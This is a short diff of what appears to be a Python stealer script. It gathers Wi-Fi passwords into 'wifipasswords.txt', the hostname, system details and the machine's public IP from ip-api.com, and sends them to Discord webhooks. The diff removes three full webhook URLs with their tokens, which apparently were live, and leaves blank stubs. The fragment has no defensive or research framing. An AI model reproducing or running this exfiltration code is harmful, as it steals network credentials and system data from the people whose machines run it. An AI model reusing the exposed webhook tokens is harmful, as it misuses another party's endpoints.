@@ -14,9 +14,9 @@ fname = "wifipasswords.txt"
 hostname = socket.gethostname()
 system_info = platform.uname()
 
-wifi_hook = Webhook("https://discord.com/api/webhooks/880554721922916402/1OL1oEL7pLryhFkGrCl7lNR5xethn5gms8JlEpRHbM-kVQwwutuZ7F00aq-a43pJcSHz")
-no_wifi_hook = Webhook("https://discord.com/api/webhooks/880554730462535751/TVU-jyTKMLkqE3BqXBE3xHMvEMRj-iX-5TXVaYkxfzYMYxrHkRh8kQn_tcjupCaKk9JU") 
-ip_hook = Webhook("https://discord.com/api/webhooks/880516595670192208/7H7vG-feqnASTWD8VyZzv2uBHo1y3zJ8dtANpVW6e1qcUcAgvmmuoduf9EGarg00nKk7") 
+wifi_hook = Webhook("https://discord.com/api/webhooks/")
+no_wifi_hook = Webhook("https://discord.com/api/webhooks/") 
+ip_hook = Webhook("https://discord.com/api/webhooks/") 
 
 ip_data = req.get("http://ip-api.com/json").json()
 
